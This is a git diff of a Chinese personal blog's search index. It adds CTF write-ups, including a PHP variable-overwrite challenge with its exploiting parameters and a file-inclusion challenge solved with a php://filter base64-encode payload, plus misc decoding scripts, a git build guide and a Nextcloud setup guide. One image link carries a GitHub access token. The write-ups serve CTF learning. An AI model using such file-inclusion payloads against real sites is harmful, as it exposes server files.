+<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>变量覆盖漏洞</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>好多payload:</p>
+<pre><code>yds=flag
+is=flag&amp;flag=flag
+</code></pre>
+<h2 id="Had-a-bad-day"><a href="#Had-a-bad-day" class="headerlink" title="Had a bad day"></a>Had a bad day</h2><p>php://filter应用</p>
+<p><a href="https://oatmeal.vip/security/web-learning/php-filter/">https://oatmeal.vip/security/web-learning/php-filter/</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> 	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>构造:</p>
+<pre><code>php://filter/convert.base64-encode/write=woofers/resource=flag
+</code></pre>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>代码审计</tag>
+        <tag>文件包含</tag>
+      </tags>
   </entry>
   <entry>
     <title>2021秋季赛部分wp</title>
@@ -1150,6 +1181,85 @@ var_dump(file_get_contents(&quot;/flag&quot;));
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2021Roke</title>
+    <url>/posts/46047524/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>58.245.43.163</title>
+    <url>/posts/b47b00b2/</url>
+    <content><![CDATA[<h1 id="这几把谁啊，真是闲的蛋疼"><a href="#这几把谁啊，真是闲的蛋疼" class="headerlink" title="这几把谁啊，真是闲的蛋疼"></a>这几把谁啊，真是闲的蛋疼</h1><p>一共访问了1700多次，合着跑字典呢</p>
+<p><img src="https://raw.githubusercontent.com/Haorical/images/master/2021/20210818114140.png?token=AQ4CEDHEUHVKVWVNHKIAYQDBDSA3A" alt="git"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>CUMT初夏赛部分wp</title>
+    <url>/posts/b061f28/</url>
+    <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><blockquote>
+<p>这次队友很给力，大佬pwn几乎全做完了，我这个摸鱼选手很惭愧，最后得分听高的，web刷题，在这次有了点收获，最少有思路了，和另一个大佬一交流，就做出来了，最近刷题还是很值得的。</p>
+</blockquote>
+<h2 id="ez-base"><a href="#ez-base" class="headerlink" title="ez_base"></a>ez_base</h2><p>扫码获得压缩包密码，打开后观察文件，将字符串翻转一下，base32解密发现png头，转图片得到flag</p>
+<h2 id="ez-img"><a href="#ez-img" class="headerlink" title="ez_img"></a>ez_img</h2><p>图片明显没显示全，直接爆破高，改高后获得flag</p>
+<h2 id="一个不小的文件"><a href="#一个不小的文件" class="headerlink" title="一个不小的文件"></a>一个不小的文件</h2><p>文件很大，最后=结尾，怀疑base64，观察前几个字符，怀疑base64套娃，直接上脚本获得flag</p>
+<pre><code>#-*- coding:utf-8 -*-
+import base64
+
+s=&#39;&#39;
+with open(&#39;problem.txt&#39;, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:
+    s=&quot;&quot;.join(f.readlines()).encode(&#39;utf-8&#39;)
+src=s
+while True:
+    try:
+        src=s
+        s=base64.b64decode(s)
+        str(s,&#39;utf-8&#39;)
+        continue
+    except:
+        pass
+    break
+with open(&#39;result.txt&#39;,&#39;w&#39;, encoding=&#39;utf-8&#39;) as file:
+    file.write(str(src,&#39;utf-8&#39;))
+print(&quot;ok!&quot;)
+</code></pre>
+<h2 id="嗷呜"><a href="#嗷呜" class="headerlink" title="嗷呜"></a>嗷呜</h2><p>这个属实被整懵逼了，兽音译者翻译后获得</p>
+<pre><code>fc34f44b75ae100abb2af0e28b9251e5e59b5faf
+</code></pre>
+<p>最后给hint才知道是个p2p种子</p>
+<pre><code>payload：magnet:?xt=urn:btih:fc34f44b75ae100abb2af0e28b9251e5e59b5faf
+</code></pre>
+<p>下载后零宽字符隐写，网站解码获得flag</p>
+<h2 id="键盘侠"><a href="#键盘侠" class="headerlink" title="键盘侠"></a>键盘侠</h2><p>wireshark打开，发现全是USB协议，了解了一下，1.9.1的最后8个字节记录键盘数据，不断在变，直接用tshark提取不出来，对着表一个个对，获得flag</p>
+<h2 id="LRU"><a href="#LRU" class="headerlink" title="LRU"></a>LRU</h2><p>直接贴脚本</p>
+<pre><code>def replace_word(l, a):
+    l.remove(a)
+    l.append(a)
+    return l
+
+
+str = &#39;3 0 @ &#123; o e f m t c y f e o &#123; @ 0 3 a u o r t r o u a 3 o @ &#123; e f y e &#123; @ o 3 a u o r 0 _ i o u e y g a 3 @ h 0 _ t o u e y b 3 a @ _ 0 d c @ a 3 b g e u o f t y g j k z c v f h j k v n m r t u i p k j y t r f v n m d e w o i u h g r k l m u t r e d f h n b f d e u i o p l m n g h y t r e w a q z x c f h j y e s &#125; j h f c x z q a b d e g&#39;
+i_str = list(&#39;cfmteo&#123;@0uya&#39;)
+s_str = str.split(&#39; &#39;)
+flag = []
+
+for i in s_str:
+        if i in i_str:
+            i_str = replace_word(i_str, i)
+        else:
+            a, *i_str = i_str
+            i_str.append(i)
+            flag.append(a)
+        print(i_str)
+print(&#39;&#39;.join(flag))
+</code></pre>
+]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -1252,73 +1362,6 @@ while os.path.exists(p1) or os.path.exists(p2):
       </tags>
   </entry>
   <entry>
-    <title>CUMT初夏赛部分wp</title>
-    <url>/posts/b061f28/</url>
-    <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><blockquote>
-<p>这次队友很给力，大佬pwn几乎全做完了，我这个摸鱼选手很惭愧，最后得分听高的，web刷题，在这次有了点收获，最少有思路了，和另一个大佬一交流，就做出来了，最近刷题还是很值得的。</p>
-</blockquote>
-<h2 id="ez-base"><a href="#ez-base" class="headerlink" title="ez_base"></a>ez_base</h2><p>扫码获得压缩包密码，打开后观察文件，将字符串翻转一下，base32解密发现png头，转图片得到flag</p>
-<h2 id="ez-img"><a href="#ez-img" class="headerlink" title="ez_img"></a>ez_img</h2><p>图片明显没显示全，直接爆破高，改高后获得flag</p>
-<h2 id="一个不小的文件"><a href="#一个不小的文件" class="headerlink" title="一个不小的文件"></a>一个不小的文件</h2><p>文件很大，最后=结尾，怀疑base64，观察前几个字符，怀疑base64套娃，直接上脚本获得flag</p>
-<pre><code>#-*- coding:utf-8 -*-
-import base64
-
-s=&#39;&#39;
-with open(&#39;problem.txt&#39;, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:
-    s=&quot;&quot;.join(f.readlines()).encode(&#39;utf-8&#39;)
-src=s
-while True:
-    try:
-        src=s
-        s=base64.b64decode(s)
-        str(s,&#39;utf-8&#39;)
-        continue
-    except:
-        pass
-    break
-with open(&#39;result.txt&#39;,&#39;w&#39;, encoding=&#39;utf-8&#39;) as file:
-    file.write(str(src,&#39;utf-8&#39;))
-print(&quot;ok!&quot;)
-</code></pre>
-<h2 id="嗷呜"><a href="#嗷呜" class="headerlink" title="嗷呜"></a>嗷呜</h2><p>这个属实被整懵逼了，兽音译者翻译后获得</p>
-<pre><code>fc34f44b75ae100abb2af0e28b9251e5e59b5faf
-</code></pre>
-<p>最后给hint才知道是个p2p种子</p>
-<pre><code>payload：magnet:?xt=urn:btih:fc34f44b75ae100abb2af0e28b9251e5e59b5faf
-</code></pre>
-<p>下载后零宽字符隐写，网站解码获得flag</p>
-<h2 id="键盘侠"><a href="#键盘侠" class="headerlink" title="键盘侠"></a>键盘侠</h2><p>wireshark打开，发现全是USB协议，了解了一下，1.9.1的最后8个字节记录键盘数据，不断在变，直接用tshark提取不出来，对着表一个个对，获得flag</p>
-<h2 id="LRU"><a href="#LRU" class="headerlink" title="LRU"></a>LRU</h2><p>直接贴脚本</p>
-<pre><code>def replace_word(l, a):
-    l.remove(a)
-    l.append(a)
-    return l
-
-
-str = &#39;3 0 @ &#123; o e f m t c y f e o &#123; @ 0 3 a u o r t r o u a 3 o @ &#123; e f y e &#123; @ o 3 a u o r 0 _ i o u e y g a 3 @ h 0 _ t o u e y b 3 a @ _ 0 d c @ a 3 b g e u o f t y g j k z c v f h j k v n m r t u i p k j y t r f v n m d e w o i u h g r k l m u t r e d f h n b f d e u i o p l m n g h y t r e w a q z x c f h j y e s &#125; j h f c x z q a b d e g&#39;
-i_str = list(&#39;cfmteo&#123;@0uya&#39;)
-s_str = str.split(&#39; &#39;)
-flag = []
-
-for i in s_str:
-        if i in i_str:
-            i_str = replace_word(i_str, i)
-        else:
-            a, *i_str = i_str
-            i_str.append(i)
-            flag.append(a)
-        print(i_str)
-print(&#39;&#39;.join(flag))
-</code></pre>
-]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>V&amp;NCTF2021</title>
     <url>/posts/6dd4bc92/</url>
     <content><![CDATA[<blockquote>
@@ -1372,83 +1415,6 @@ print(&#39;&#39;.join(flag))
       <categories>
         <category>哎，我就是玩</category>
       </categories>
-  </entry>
-  <entry>
-    <title>git更新</title>
-    <url>/posts/bc46b23a/</url>
-    <content><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><blockquote>
-<p>因为vscode ssh要求服务器git得&gt;2,更新了个git，发现push不上去了，又把服务器搞崩了，还得重新配环境。。。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidoc</span><br><span class="line"></span><br><span class="line">yum install  gcc perl-ExtUtils-MakeMaker</span><br><span class="line"></span><br><span class="line">yum remove git</span><br><span class="line"></span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;</span><br><span class="line"></span><br><span class="line">wget https:&#x2F;&#x2F;mirrors.edge.kernel.org&#x2F;pub&#x2F;software&#x2F;scm&#x2F;git&#x2F;git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">tar -xvf git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">cd git-2.23.0&#x2F;</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git all</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git install</span><br><span class="line"></span><br><span class="line">echo &quot;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;git&#x2F;bin&quot; &gt;&gt; &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">git --version</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>开发工具</category>
-      </categories>
-      <tags>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>nextcloud安装及踩坑指南</title>
-    <url>/posts/aa5139ab/</url>
-    <content><![CDATA[<blockquote>
-<p>服务器除了用来搭博客和内网穿透之外没干其他的，感觉有点浪费，今天简简单单搭了个网盘打算榨干它。</p>
-</blockquote>
-<h1 id="私有云选择"><a href="#私有云选择" class="headerlink" title="私有云选择"></a>私有云选择</h1><p>尝试了以下几个</p>
-<ol>
-<li>cloudreve</li>
-<li>seafile</li>
-<li>nextcloud</li>
-</ol>
-<p> cloudreve比较nt，属于傻瓜式，这个不展开了</p>
-<p>seafile就比较复杂，不过有详细的<a href="https://cloud.seafile.com/published/seafile-manual-cn/home.md">官方文档</a>，一步一步来就行，我最后搭建成功了，但无法外网访问，应该是反向代理的问题，nginx反向代理配置这比较复杂。</p>
-<p>最后选择的是nextcloud,感觉用起来和onedrive差不多，不过既然是榨干服务器，就不管这么多了。</p>
-<h1 id="安装指南"><a href="#安装指南" class="headerlink" title="安装指南"></a>安装指南</h1><h2 id="服务器安装宝塔面板和LNMP环境"><a href="#服务器安装宝塔面板和LNMP环境" class="headerlink" title="服务器安装宝塔面板和LNMP环境"></a>服务器安装宝塔面板和LNMP环境</h2><p>这个在阿里云可以一键配置，不过重装的话要慎重。</p>
-<p><img src="https://img-blog.csdnimg.cn/4f9f34086cac44848091876038542157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>安装的教程也一大堆，这个比较简单。</p>
-<h2 id="新建站点"><a href="#新建站点" class="headerlink" title="新建站点"></a>新建站点</h2><p>马赛克处是域名和站点目录，php版本记得选择7.2以上的</p>
-<p><img src="https://img-blog.csdnimg.cn/ae965156e3274e97a1edd3e6de6cc00f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/ec6309d6b2ae4bc4afcca9c45776905a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="部署nextcloud"><a href="#部署nextcloud" class="headerlink" title="部署nextcloud"></a>部署nextcloud</h2><p>在<a href="https://nextcloud.com/install/#instructions-server">官网</a>下载nextcloud,下载完是一个压缩包，上传到刚建立的站点目录上，在线解压，如图</p>
-<p><img src="https://img-blog.csdnimg.cn/c413fb8bf47948b7b4b87ecfc0db7e9c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>然后直接访问刚才绑定的域名，会让配置管理员等。进来之后就是这个了。</p>
-<p><img src="https://img-blog.csdnimg.cn/029643a8e43b4bad8077560c12de1dc4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>感觉相当于网页版的onedrive，客户端涵盖主流设备可以在官网或控制台下载也可以直接用网页版的，客户端需要绑定域名。</p>
-<p><strong>enjoy!</strong></p>
-<h1 id="踩坑指南"><a href="#踩坑指南" class="headerlink" title="踩坑指南"></a>踩坑指南</h1><h2 id="不要使用php那个安装方法"><a href="#不要使用php那个安装方法" class="headerlink" title="不要使用php那个安装方法"></a>不要使用php那个安装方法</h2><p>亲测网速太慢，160MB安装到什么时候，过一会就502，这个方法不建议</p>
-<p><img src="https://img-blog.csdnimg.cn/c34a492054e94984b7be2ce12b42b667.png" alt="在这里插入图片描述"></p>
-<h2 id="php版本"><a href="#php版本" class="headerlink" title="php版本"></a>php版本</h2><p>7.2以上，太低不支持。</p>
-<h2 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir()"></a>open_basedir()</h2><p>不要在宝塔开防止跨站攻击，会禁用这个函数，然后会一直报错。</p>
-<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><h2 id="网页版"><a href="#网页版" class="headerlink" title="网页版"></a>网页版</h2><p><img src="https://img-blog.csdnimg.cn/f3e47df24bb340fc86059b5a6350cfa5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="win客户端"><a href="#win客户端" class="headerlink" title="win客户端"></a>win客户端</h2><p><img src="https://img-blog.csdnimg.cn/159c13e5061941968b962190c8c02a6f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b4380ed44fc64812b81efbf854040122.png" alt="在这里插入图片描述"></p>
-<blockquote>
-<p>跟onedrive好像，也是直接把文件拖到工作区就能上传，还能自动同步。</p>
-</blockquote>
-<h2 id="android客户端"><a href="#android客户端" class="headerlink" title="android客户端"></a>android客户端</h2><p><img src="https://img-blog.csdnimg.cn/29ae730f74764937b67f756ccdf7e13e.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="请添加图片描述"></p>
-<blockquote>
-<p>UI不错</p>
-</blockquote>
-<hr>
-<h1 id="挂载oss"><a href="#挂载oss" class="headerlink" title="挂载oss"></a>挂载oss</h1><blockquote>
-<p>oss用来当图床有点浪费,可以利用ossfs挂载到服务器上</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/7a49ae9e71b64f3f92358d5534d3da36.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><del>一共256T，能装好多小姐姐</del></p>
-<ol>
-<li><p><a href="https://help.aliyun.com/document_detail/153892.html?spm=a2c4g.11186623.6.903.692e7a74lkBKbz">官方文档</a>有详细操作，先把bucket挂载到文件夹</p>
-</li>
-<li><p>在nextcloud开启externalstorage，在设置中外部存储选则挂载的位置<br><img src="https://img-blog.csdnimg.cn/d663518b1e624535a6095021f7006900.png" alt="在这里插入图片描述"></p>
-</li>
-</ol>
-<p> 宝塔可以直接识别，好爽</p>
-<p><img src="https://img-blog.csdnimg.cn/b1bc5b927f72461ca5c8acfafaa18a18.png" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>哎，我就是玩</category>
-      </categories>
-      <tags>
-        <tag>server</tag>
-      </tags>
   </entry>
   <entry>
     <title>git学习</title>
@@ -1515,6 +1481,21 @@ print(&#39;&#39;.join(flag))
       </tags>
   </entry>
   <entry>
+    <title>git更新</title>
+    <url>/posts/bc46b23a/</url>
+    <content><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><blockquote>
+<p>因为vscode ssh要求服务器git得&gt;2,更新了个git，发现push不上去了，又把服务器搞崩了，还得重新配环境。。。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidoc</span><br><span class="line"></span><br><span class="line">yum install  gcc perl-ExtUtils-MakeMaker</span><br><span class="line"></span><br><span class="line">yum remove git</span><br><span class="line"></span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;</span><br><span class="line"></span><br><span class="line">wget https:&#x2F;&#x2F;mirrors.edge.kernel.org&#x2F;pub&#x2F;software&#x2F;scm&#x2F;git&#x2F;git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">tar -xvf git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">cd git-2.23.0&#x2F;</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git all</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git install</span><br><span class="line"></span><br><span class="line">echo &quot;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;git&#x2F;bin&quot; &gt;&gt; &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">git --version</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>开发工具</category>
+      </categories>
+      <tags>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>jwt总结</title>
     <url>/posts/e8e4811b/</url>
     <content><![CDATA[]]></content>
@@ -1524,6 +1505,68 @@ print(&#39;&#39;.join(flag))
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>nextcloud安装及踩坑指南</title>
+    <url>/posts/aa5139ab/</url>
+    <content><![CDATA[<blockquote>
+<p>服务器除了用来搭博客和内网穿透之外没干其他的，感觉有点浪费，今天简简单单搭了个网盘打算榨干它。</p>
+</blockquote>
+<h1 id="私有云选择"><a href="#私有云选择" class="headerlink" title="私有云选择"></a>私有云选择</h1><p>尝试了以下几个</p>
+<ol>
+<li>cloudreve</li>
+<li>seafile</li>
+<li>nextcloud</li>
+</ol>
+<p> cloudreve比较nt，属于傻瓜式，这个不展开了</p>
+<p>seafile就比较复杂，不过有详细的<a href="https://cloud.seafile.com/published/seafile-manual-cn/home.md">官方文档</a>，一步一步来就行，我最后搭建成功了，但无法外网访问，应该是反向代理的问题，nginx反向代理配置这比较复杂。</p>
+<p>最后选择的是nextcloud,感觉用起来和onedrive差不多，不过既然是榨干服务器，就不管这么多了。</p>
+<h1 id="安装指南"><a href="#安装指南" class="headerlink" title="安装指南"></a>安装指南</h1><h2 id="服务器安装宝塔面板和LNMP环境"><a href="#服务器安装宝塔面板和LNMP环境" class="headerlink" title="服务器安装宝塔面板和LNMP环境"></a>服务器安装宝塔面板和LNMP环境</h2><p>这个在阿里云可以一键配置，不过重装的话要慎重。</p>
+<p><img src="https://img-blog.csdnimg.cn/4f9f34086cac44848091876038542157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>安装的教程也一大堆，这个比较简单。</p>
+<h2 id="新建站点"><a href="#新建站点" class="headerlink" title="新建站点"></a>新建站点</h2><p>马赛克处是域名和站点目录，php版本记得选择7.2以上的</p>
+<p><img src="https://img-blog.csdnimg.cn/ae965156e3274e97a1edd3e6de6cc00f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/ec6309d6b2ae4bc4afcca9c45776905a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="部署nextcloud"><a href="#部署nextcloud" class="headerlink" title="部署nextcloud"></a>部署nextcloud</h2><p>在<a href="https://nextcloud.com/install/#instructions-server">官网</a>下载nextcloud,下载完是一个压缩包，上传到刚建立的站点目录上，在线解压，如图</p>
+<p><img src="https://img-blog.csdnimg.cn/c413fb8bf47948b7b4b87ecfc0db7e9c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>然后直接访问刚才绑定的域名，会让配置管理员等。进来之后就是这个了。</p>
+<p><img src="https://img-blog.csdnimg.cn/029643a8e43b4bad8077560c12de1dc4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>感觉相当于网页版的onedrive，客户端涵盖主流设备可以在官网或控制台下载也可以直接用网页版的，客户端需要绑定域名。</p>
+<p><strong>enjoy!</strong></p>
+<h1 id="踩坑指南"><a href="#踩坑指南" class="headerlink" title="踩坑指南"></a>踩坑指南</h1><h2 id="不要使用php那个安装方法"><a href="#不要使用php那个安装方法" class="headerlink" title="不要使用php那个安装方法"></a>不要使用php那个安装方法</h2><p>亲测网速太慢，160MB安装到什么时候，过一会就502，这个方法不建议</p>
+<p><img src="https://img-blog.csdnimg.cn/c34a492054e94984b7be2ce12b42b667.png" alt="在这里插入图片描述"></p>
+<h2 id="php版本"><a href="#php版本" class="headerlink" title="php版本"></a>php版本</h2><p>7.2以上，太低不支持。</p>
+<h2 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir()"></a>open_basedir()</h2><p>不要在宝塔开防止跨站攻击，会禁用这个函数，然后会一直报错。</p>
+<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><h2 id="网页版"><a href="#网页版" class="headerlink" title="网页版"></a>网页版</h2><p><img src="https://img-blog.csdnimg.cn/f3e47df24bb340fc86059b5a6350cfa5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="win客户端"><a href="#win客户端" class="headerlink" title="win客户端"></a>win客户端</h2><p><img src="https://img-blog.csdnimg.cn/159c13e5061941968b962190c8c02a6f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b4380ed44fc64812b81efbf854040122.png" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>跟onedrive好像，也是直接把文件拖到工作区就能上传，还能自动同步。</p>
+</blockquote>
+<h2 id="android客户端"><a href="#android客户端" class="headerlink" title="android客户端"></a>android客户端</h2><p><img src="https://img-blog.csdnimg.cn/29ae730f74764937b67f756ccdf7e13e.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="请添加图片描述"></p>
+<blockquote>
+<p>UI不错</p>
+</blockquote>
+<hr>
+<h1 id="挂载oss"><a href="#挂载oss" class="headerlink" title="挂载oss"></a>挂载oss</h1><blockquote>
+<p>oss用来当图床有点浪费,可以利用ossfs挂载到服务器上</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/7a49ae9e71b64f3f92358d5534d3da36.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><del>一共256T，能装好多小姐姐</del></p>
+<ol>
